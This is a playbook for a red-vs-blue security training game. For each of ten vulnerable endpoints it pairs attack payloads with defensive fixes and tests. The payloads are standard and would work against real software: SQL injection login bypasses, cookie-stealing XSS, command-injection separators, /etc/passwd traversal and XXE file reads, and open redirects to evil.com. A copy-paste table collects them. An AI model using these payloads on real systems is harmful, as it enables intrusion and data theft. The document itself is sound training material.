# Red vs Blue Team Playbook

All payloads in this document are verified against the actual validator logic in
`backend/app/api/red_blue.py` and the real challenge endpoint contracts in
`backend/app/api/challenges.py`. Each entry explains the exact string to type into
the payload field and what the server does with it.

---

## How the Game Works

| Role | Goal |
|------|------|
| **Red Team** | Submit a payload that the validator marks as **confirmed** |
| **Blue Team** | Submit fixed code that passes all sandbox tests |

**Scoring:**
- Red **+1** for every confirmed exploit (`success: true` from the validator).
- Blue **+1 (real fix)** for every code submission that passes sandbox tests, submitted *after* red lands the first confirmed exploit.
- Blue **+1 (defensive block)** automatically when a red payload is rejected.

Blue cannot submit a fix until red has at least one confirmed exploit in that game.

---

## Mode 1 — SQL Injection

### Validator flow
Sends `POST /api/challenges/vulnerable-login` with body:
```json
{ "username": "<your payload>", "password": "wrongpassword" }
```
Confirms **success** when the response is HTTP 200 and contains a `"user"` key.

The endpoint builds the query by string concatenation with a **MySQL** database:
```sql
SELECT * FROM users WHERE username = '<payload>' AND password = 'wrongpassword'
```
The DB contains one row: `admin / password123`.

### Why `' OR 1=1 --` does NOT work (MySQL)
MySQL requires `-- ` (dash dash **space**) to start an inline comment.  
Without the trailing space, `--'` is treated as invalid syntax → the DB throws an error → the server returns HTTP 400 → validator returns **failed**.

### Red Team — Working Payloads

**Payload 1 — `#` comment (primary, recommended)**
```
' OR 1=1 #
```
Final query:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 #' AND password = 'wrongpassword'
```
`#` is a MySQL comment. Everything after it is ignored. `OR 1=1` makes the condition always true. Admin row is returned.

**Payload 2 — `-- ` with trailing space**
```
' OR 1=1 -- 
```
*(There is a space after the two dashes.)*
```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'wrongpassword'
```
`-- ` (with space) is a valid MySQL comment.

**Payload 3 — No comment needed (quote balancing)**
```
' OR '1'='1' OR 'x'='x
```
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' OR 'x'='x' AND password = 'wrongpassword'
```
`OR '1'='1'` is always true. No comment required.

**Payload 4 — Admin-targeted with `#`**
```
admin' #
```
```sql
SELECT * FROM users WHERE username = 'admin' #' AND password = 'wrongpassword'
```
Matches the admin username directly; password check commented out.

**Confirmed by:** HTTP 200 with `{"message": "Login successful!", "user": "admin"}`.

---

### Blue Team — Successful Defense

**Root cause:** String concatenation lets the payload escape the username string and inject arbitrary SQL.

**Fix 1 — SQLAlchemy parameterized query**
```python
result = db.execute(
    text("SELECT * FROM users WHERE username = :u AND password = :p"),
    {"u": attempt.username, "p": attempt.password}
).mappings().first()
```

**Fix 2 — ORM filter (never string-formats user input)**
```python
user = db.query(User).filter(
    User.username == attempt.username,
    User.password == attempt.password
).first()
```

**Sandbox tests that must pass:**
- `username = "' OR 1=1 #"` → HTTP **401** Unauthorized.
- Valid credentials `admin / password123` → HTTP **200**.

---

## Mode 2 — XSS (Cross-Site Scripting)

### Validator flow
Sends `POST /api/challenges/xss/comments` with body:
```json
{ "author": "attacker", "content": "<your payload>" }
```
Confirms **success** when the server returns HTTP 200 or 201 AND the payload (lowercase) contains any of: `<script`, `onerror=`, `onload=`, `javascript:`.

The endpoint stores the comment as-is — no sanitization.

### Red Team — Working Payloads

**Payload 1 — Script tag (primary, recommended)**
```
<script>alert(document.cookie)</script>
```

**Payload 2 — img onerror**
```
<img src=x onerror=alert(1)>
```

**Payload 3 — SVG onload**
```
<svg onload=alert(document.cookie)>
```

**Payload 4 — javascript: URI**
```
<a href="javascript:alert(1)">click</a>
```

**Confirmed by:** HTTP 200/201 — the server stored the raw script tag.  
The validator does not need to check the response body; it only verifies that a known XSS vector was accepted.

---

### Blue Team — Successful Defense

**Root cause:** The comment content is stored and later rendered in HTML without encoding.

**Fix 1 — HTML-escape on store**
```python
import html
row = XSSComment(author=comment.author, content=html.escape(comment.content or ""))
```

**Fix 2 — bleach sanitizer (strip all tags)**
```python
import bleach
safe = bleach.clean(comment.content or "", tags=[], strip=True)
row = XSSComment(author=comment.author, content=safe)
```

**Fix 3 — Jinja2 template: never use `| safe`**
```html
{{ comment.content }}        {# auto-escaped ✓ #}
{{ comment.content | safe }} {# VULNERABLE ✗ #}
```

**Sandbox tests that must pass:**
- Posting `<script>alert(1)</script>` and then fetching comments returns `&lt;script&gt;` (escaped) — the browser must not see a raw `<script>` tag.

---

## Mode 3 — CSRF (Cross-Site Request Forgery)

### Validator flow
Sends `POST /api/challenges/csrf/transfer` as **form-encoded data** (`application/x-www-form-urlencoded`):
```
to_user=Bob&amount=100
```
Confirms **success** when the server returns HTTP 200.

The endpoint transfers money from Alice (balance: 1000) to the named recipient with **no CSRF token or origin check**. The recipient must exist in the DB. Alice's initial balance is 1000, so the amount must be ≤ 1000.

### Red Team — Working Payloads

**Payload 1 — Leave the field blank (use validator default)**
```
(empty — or type any non-JSON string)
```
The validator automatically sends `to_user=Bob&amount=100`.

**Payload 2 — JSON object (parsed and sent as form)**
```json
{"amount": 100, "to_user": "Bob"}
```
The validator parses this JSON and sends it as form-encoded fields.

**Payload 3 — Larger amount (still within Alice's 1000 balance)**
```json
{"amount": 500, "to_user": "Bob"}
```

> **Do NOT use amounts > 1000.** Alice starts with 1000. If her balance is already lower from a previous attack, use a smaller amount (e.g., 50 or 10).

**Confirmed by:** HTTP 200 with `{"message": "Transferred $100 to Bob"}`.

---

### Blue Team — Successful Defense

**Root cause:** The server relies solely on the session cookie and does not verify the request came from the legitimate page.

**Fix 1 — CSRF token (synchronizer token pattern)**
```python
import secrets
# On page render:
session['csrf_token'] = secrets.token_hex(32)
# On form POST:
if request.form.get('csrf_token') != session.get('csrf_token'):
    abort(403)
```

**Fix 2 — SameSite cookie**
```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

**Fix 3 — Check Origin header**
```python
origin = request.headers.get('Origin', '')
if not origin.startswith('https://yourdomain.com'):
    abort(403)
```

**Sandbox tests that must pass:**
- Cross-origin POST without a CSRF token → **403**.
- Same-origin POST with valid token → **200**.

---

## Mode 4 — Command Injection

### Validator flow
Sends `POST /api/challenges/ping` with body:
```json
{ "host": "<your payload>" }
```
Confirms **success** when HTTP 200 AND `response["success"] == true`.

The endpoint detects shell separators (`;`, `|`, `&&`, `||`) in the host field. It runs the ping safely, but **simulates injection success** when the injected segment contains the exact string `COMMAND_INJECTION_SUCCESS`.

### Red Team — Working Payloads

**Payload 1 — Semicolon with marker (primary, recommended)**
```
127.0.0.1; echo COMMAND_INJECTION_SUCCESS
```
Server detects `;`, splits off `echo COMMAND_INJECTION_SUCCESS`, finds the marker string in the injected segment → sets `success: true`.

**Payload 2 — Pipe**
```
127.0.0.1 | echo COMMAND_INJECTION_SUCCESS
```

**Payload 3 — Double-ampersand**
```
127.0.0.1 && echo COMMAND_INJECTION_SUCCESS
```

**Payload 4 — OR operator**
```
127.0.0.1 || echo COMMAND_INJECTION_SUCCESS
```

**Confirmed by:** HTTP 200 with `{"output": "...[simulated]...", "success": true}`.

> The marker `COMMAND_INJECTION_SUCCESS` must appear verbatim in the injected segment (after the separator). The actual shell command is not executed on the server for safety.

---

### Blue Team — Successful Defense

**Root cause:** User input reaches a shell interpreter; separators inject extra commands.

**Fix 1 — subprocess list + no shell=True**
```python
import subprocess, re

def safe_ping(host: str) -> str:
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError("Invalid host format")
    result = subprocess.run(
        ["ping", "-c", "1", host],
        shell=False, capture_output=True, text=True, timeout=5
    )
    return result.stdout + result.stderr
```

**Fix 2 — Allowlist of permitted hosts**
```python
ALLOWED = {"localhost", "127.0.0.1"}
if host not in ALLOWED:
    return {"error": "Host not permitted"}, 400
```

**Sandbox tests that must pass:**
- `"127.0.0.1; echo COMMAND_INJECTION_SUCCESS"` → `success` must be `false` (injection blocked).
- `"127.0.0.1"` → normal ping output.

---

## Mode 5 — Broken Authentication

### Validator flow
Sends `POST /api/auth/login?challenge=broken-auth` with:
```json
{ "username": "<part before first :>", "password": "<part after first :>" }
```
Confirms **success** when the response contains `"bypass_success": true` — meaning the admin row was returned **without** the correct password matching.

The endpoint runs the login against an **in-memory SQLite** database (not MySQL):
```
admin@scale.edu / secret123  (admin)
user@scale.edu  / user123    (user)
```
SQLite treats `--` as a comment even without a trailing space.

### Red Team — Working Payloads

Use `username:password` format in the payload field.

**Payload 1 — OR bypass with SQLite comment (primary, recommended)**
```
' OR 1=1 --:x
```
- username = `' OR 1=1 --`
- password = `x`

SQLite query:
```sql
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = 'x'
```
`--` is a comment. Returns admin row. `x ≠ secret123` → `bypass_success: true`.

**Payload 2 — Admin email with comment**
```
admin@scale.edu' --:x
```
```sql
SELECT * FROM users WHERE email = 'admin@scale.edu' --' AND password = 'x'
```
Matches admin directly; password check skipped.

**Payload 3 — Always-true OR (no comment needed)**
```
' OR '1'='1' OR 'a'='a:wrongpassword
```
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' OR 'a'='a' AND password = 'wrongpassword'
```
The `OR '1'='1'` evaluates to true; admin is first row; password doesn't match → `bypass_success: true`.

**Confirmed by:** HTTP 200 with `{"bypass_success": true, "is_admin": true, ...}`.

---

### Blue Team — Successful Defense

**Root cause:** Same as Mode 1 — login query built by string interpolation.

**Fix 1 — Parameterized query**
```python
cursor.execute(
    "SELECT * FROM users WHERE email = ? AND password = ?",
    (username, password)
)
```

**Fix 2 — Hash passwords + safe comparison**
```python
import bcrypt

user = get_user_safely(username)  # parameterized
if not user or not bcrypt.checkpw(password.encode(), user.hashed_password):
    raise HTTPException(401, "Invalid credentials")
```

**Sandbox tests that must pass:**
- `"' OR 1=1 --"` as username → **401**.
- `admin@scale.edu` with correct password → **200**.

---

## Mode 6 — Security Misconfiguration

### Validator flow
Sends `GET /api/admin/config` with the current user's auth token.
Confirms **success** when HTTP 200 AND the response body contains the string `"secret"`.

The endpoint returns `{"secret_key": "insecure_default_secret_key", "database_url": "...", ...}` to **any** logged-in user — no admin role check is performed.

### Red Team — Working Payloads

No body payload is needed. The exploit is simply **calling the endpoint**.

**Payload 1 (primary)**
```
access_admin_config
```

**Payload 2**
```
probe
```

*(Any non-empty string works. The validator ignores the payload and fires `GET /api/admin/config`.)*

**Confirmed by:** HTTP 200 with `{"secret_key": "insecure_default_secret_key", "debug": true, ...}`.

---

### Blue Team — Successful Defense

**Root cause:** Endpoint is reachable by any authenticated user; no admin role check.

**Fix 1 — Require admin role**
```python
@router.get("/admin/config")
def exposed_admin_config(current_user: User = Depends(get_current_user)):
    if current_user.role not in ("admin",):
        raise HTTPException(403, "Admin access required")
    ...
```

**Fix 2 — Disable endpoint in production**
```python
if not settings.DEBUG:
    pass  # do not register /admin/config route
```

**Fix 3 — Scrub sensitive values from response**
```python
REDACT = {"secret_key", "database_url", "env_sample"}
return {k: "[REDACTED]" for k in config if k in REDACT} | \
       {k: v for k, v in config.items() if k not in REDACT}
```

**Sandbox tests that must pass:**
- Non-admin user → **403 Forbidden**.
- Admin user → **200** with config data.

---

## Mode 7 — Insecure Storage

### Validator flow
Sends `GET /api/challenges/storage/dump` (no auth required, no body).
Confirms **success** when HTTP 200 AND the response body is a non-empty list or dict.

The endpoint returns the full in-memory `INSECURE_USERS` dict with **plaintext passwords** for Alice, Bob, and Admin.

### Red Team — Working Payloads

No payload is required.

**Payload 1 (primary)**
```
dump
```

**Payload 2**
```
(leave blank)
```

*(Any string works. The validator ignores it and fires `GET /api/challenges/storage/dump`.)*

**Confirmed by:** HTTP 200 with:
```json
{
  "users": [
    {"username": "alice", "password": "password123"},
    {"username": "bob",   "password": "qwerty"},
    {"username": "admin", "password": "admin123"}
  ]
}
```

---

### Blue Team — Successful Defense

**Root cause:** Passwords stored as plaintext in memory and returned raw by the dump endpoint.

**Fix 1 — Hash before storing**
```python
import hashlib
INSECURE_USERS[username] = hashlib.sha256(password.encode()).hexdigest()
```

**Fix 2 — Never expose password in the dump response**
```python
return jsonify([{"username": u} for u in USERS])
```

**Fix 3 — Require admin authorization on the dump endpoint**
```python
@app.route("/storage/dump")
def dump():
    if not is_admin(current_user):
        abort(403)
    ...
```

**Sandbox tests that must pass:**
- `GET /storage/dump` must NOT contain a field called `password` with a plaintext value.
- After `POST /storage/register`, the stored value must be a hash (≥ 64 hex chars).

---

## Mode 8 — Directory Traversal

### Validator flow
Sends `GET /api/challenges/traversal/read?file=<your payload>`.
Confirms **success** when HTTP 200 AND the body contains any of: `root:`, `passwd`, `etc`, `[files]`.

The endpoint does `os.path.join("/app/uploads", file)` without checking that the resolved path stays inside `/app/uploads`. The OS follows `../` sequences.

### Red Team — Working Payloads

**Payload 1 — Classic traversal (primary, recommended)**
```
../../../../etc/passwd
```
Resolved path: `/app/uploads/../../../../etc/passwd` → `/etc/passwd`

**Payload 2 — Extra levels (safe to add more)**
```
../../../../../etc/passwd
```

**Payload 3 — Six levels (always works regardless of uploads depth)**
```
../../../../../../etc/passwd
```

**Confirmed by:** HTTP 200 with:
```json
{
  "content": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...",
  "accessed_path": "/etc/passwd"
}
```
The `"content"` field contains `root:` which triggers the success check.

---

### Blue Team — Successful Defense

**Root cause:** `os.path.join` does not resolve `..`; the resolved path is never compared against the base directory.

**Fix 1 — realpath + base-dir boundary check**
```python
import os

BASE = "/app/uploads"

def safe_read(filename: str) -> str:
    base_real = os.path.realpath(BASE)
    target_real = os.path.realpath(os.path.join(BASE, filename))
    if not target_real.startswith(base_real + os.sep) and target_real != base_real:
        raise HTTPException(403, "Access denied")
    if not os.path.isfile(target_real):
        raise HTTPException(404, "File not found")
    with open(target_real) as f:
        return f.read()
```

**Fix 2 — Strip traversal sequences before joining**
```python
import posixpath
filename = posixpath.normpath("/" + filename).lstrip("/")
```

**Sandbox tests that must pass:**
- `?file=../../../../etc/passwd` → **403** (secure mode blocks it).
- `?file=report.txt` → **200** with content.

---

## Mode 9 — XXE (XML External Entity)

### Validator flow
Sends `POST /api/challenges/xxe/parse` with body:
```json
{ "xml": "<your payload>", "secure": false }
```
Confirms **success** when HTTP 200 AND the body contains any of: `root:`, `/etc/passwd`, `SYSTEM`, `file://`.

The endpoint uses lxml with `resolve_entities=True` and a custom resolver that is permitted to read `/etc/passwd` from within the container.

### Red Team — Working Payloads

The payload must be submitted as a **single line** in the payload text box.

**Payload 1 — Classic file read (primary, recommended)**
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

**Payload 2 — Alternative element structure**
```
<?xml version="1.0"?><!DOCTYPE data [<!ENTITY ext SYSTEM "file:///etc/passwd">]><data><item>&ext;</item></data>
```

**Payload 3 — Nested elements**
```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY f SYSTEM "file:///etc/passwd">]><foo><bar>&f;</bar></foo>
```

**Confirmed by:** HTTP 200 with:
```json
{
  "parsed_result": "<root>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...</root>"
}
```
The response body contains `root:` which triggers the success check.

---

### Blue Team — Successful Defense

**Root cause:** lxml is configured with `resolve_entities=True` and `load_dtd=True`, allowing DOCTYPE declarations to define file-reading entities.

**Fix 1 — Disable external entities in lxml**
```python
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    load_dtd=False,
    no_network=True,
    forbid_dtd=True,
    forbid_entities=True,
)
root = etree.fromstring(xml_data.encode(), parser)
```

**Fix 2 — Use defusedxml (safe by default)**
```python
import defusedxml.ElementTree as ET
root = ET.fromstring(xml_data)
```

**Fix 3 — Block DOCTYPE at the string level**
```python
if "<!DOCTYPE" in xml_data.upper() or "<!ENTITY" in xml_data.upper():
    raise HTTPException(400, "DOCTYPE declarations are not allowed")
```

**Sandbox tests that must pass:**
- XML with `SYSTEM "file:///etc/passwd"` → parser raises error or returns **400**; `root:` must NOT appear in response.
- Valid XML without DOCTYPE → parses successfully, returns **200**.

---

## Mode 10 — Unvalidated Redirect

### Validator flow
Sends `GET /api/challenges/redirect?url=<your payload>` with `follow_redirects=False`.
Confirms **success** when the response status is 301/302/200 AND any of:
- The `Location` header starts with `http`, **or**
- The payload contains the word `evil`, **or**
- The payload does not start with `http://localhost`.

The endpoint does `return RedirectResponse(url=url, status_code=302)` — no domain check.

### Red Team — Working Payloads

**Payload 1 — External domain (primary, recommended)**
```
https://evil.com
```
Response: HTTP 302, `Location: https://evil.com`. Both the location condition (`loc.startswith("http")`) and the evil condition (`"evil" in payload`) are satisfied.

**Payload 2 — Any external HTTPS URL**
```
https://attacker.example.com
```
HTTP 302, `Location: https://attacker.example.com` starts with `http`.

**Payload 3 — Protocol-relative (demonstrates bypass)**
```
//evil.com/steal
```
Does not start with `http://localhost` → confirmed.

**Payload 4 — HTTP URL**
```
http://192.168.1.100/phishing
```
Does not start with `http://localhost` → confirmed.

**Confirmed by:** HTTP 302 with `Location: https://evil.com`.

---

### Blue Team — Successful Defense

**Root cause:** The `url` parameter is passed to `RedirectResponse` with no validation.

**Fix 1 — Allowlist of permitted relative paths**
```python
ALLOWED = {"/dashboard", "/home", "/profile", "/logout"}

@app.route("/redirect")
def safe_redirect():
    url = request.args.get("url", "/dashboard")
    if url not in ALLOWED:
        abort(400, "Invalid redirect destination")
    return redirect(url)
```

**Fix 2 — Reject absolute URLs**
```python
from urllib.parse import urlparse

def safe_redirect(url: str):
    parsed = urlparse(url)
    if parsed.scheme or parsed.netloc:
        raise HTTPException(400, "Only relative paths are permitted")
    return RedirectResponse(url=url)
```

**Fix 3 — Domain allowlist**
```python
ALLOWED_HOST = "yourdomain.com"
parsed = urlparse(url)
if parsed.netloc and parsed.netloc != ALLOWED_HOST:
    raise HTTPException(400, "External redirect not allowed")
```

**Sandbox tests that must pass:**
- `?url=https://evil.com` → **400**.
- `?url=//evil.com` → **400**.
- `?url=/dashboard` → **302** to `/dashboard`.

---

## Quick Reference — Copy-Paste Payloads

| # | Mode | Type this in the payload field |
|---|------|-------------------------------|
| 1 | SQL Injection | `' OR 1=1 #` |
| 2 | XSS | `<script>alert(document.cookie)</script>` |
| 3 | CSRF | `{"amount": 100, "to_user": "Bob"}` |
| 4 | Command Injection | `127.0.0.1; echo COMMAND_INJECTION_SUCCESS` |
| 5 | Broken Auth | `' OR 1=1 --:x` |
| 6 | Security Misc | `probe` *(any string)* |
| 7 | Insecure Storage | `dump` *(any string)* |
| 8 | Directory Traversal | `../../../../etc/passwd` |
| 9 | XXE | `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` |
| 10 | Redirect | `https://evil.com` |

---

## All Validator Bugs Fixed

The following bugs in `backend/app/api/red_blue.py` were corrected so every payload above works:

| Mode | Bug | Fix |
|------|-----|-----|
| 1 SQL Injection | `success_check` looked for `"success": true` but endpoint returns `{"user": "..."}` | Now checks for `"user"` key in response |
| 1 SQL Injection | Hint said `-- ` but MySQL requires `-- ` with trailing space or `#` | Changed hint and default to use `#` |
| 2 XSS | `build_body` sent only `{"content": ...}` but `CommentCreate` schema requires `author` too → FastAPI 422 | Now sends `{"author": "attacker", "content": ...}` |
| 3 CSRF | Sent JSON body to endpoint that requires `Form` fields → FastAPI 422 | Added `use_form: True`; validator now uses `data=` (form-encoded) |
| 3 CSRF | Default amount `9999` exceeds Alice's starting balance of `1000` → "Insufficient funds" 400 | Changed default to `100` |
| 4 Command Injection | Wrong URL `/api/calc/interest`; wrong success markers (`root:`, `passwd`) | Fixed URL to `/api/challenges/ping`; success now checks `success: true` in JSON |
| 8 Directory Traversal | Sent `?path=` but endpoint parameter is `?file=` → FastAPI 422 | Fixed to `?file=` |
| 9 XXE | Sent `{"xml_data": ...}` but endpoint reads `payload["xml"]` → empty parse | Fixed to `{"xml": ..., "secure": false}` |
